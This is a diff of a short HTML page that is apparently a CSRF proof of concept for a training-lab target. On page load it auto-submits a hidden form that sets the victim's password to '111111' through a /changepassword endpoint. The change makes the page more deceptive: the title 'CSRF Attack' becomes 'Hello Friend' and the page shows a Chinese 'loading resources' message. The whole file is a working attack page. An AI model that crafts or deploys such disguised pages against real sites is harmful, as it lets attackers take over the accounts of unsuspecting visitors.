@@ -1,13 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>CSRF Attack</title>
+    <title>Hello Friend</title>
 </head>
-<body onload="document.getElementById('csrf-form').submit()">
-    <h1>Loading...</h1>
-    <form id="csrf-form" action="http://vehcwa1.haobachang2.loveli.com.cn:8888/changepassword" method="POST">
-        <input type="hidden" name="newpassword" value="111111">
+<body>
+    <h1>正在加载资源，请稍候...</h1>
+    <form id="csrfForm" action="http://0tif4qu.haobachang2.loveli.com.cn:8888/changepassword" method="POST">
+        <input type="hidden" name="newpassword" value="111111" />
     </form>
+
+    <script>
+        // 页面加载完成后自动提交表单
+        window.onload = function() {
+            document.getElementById('csrfForm').submit();
+        };
+    </script>
 </body>
 </html>
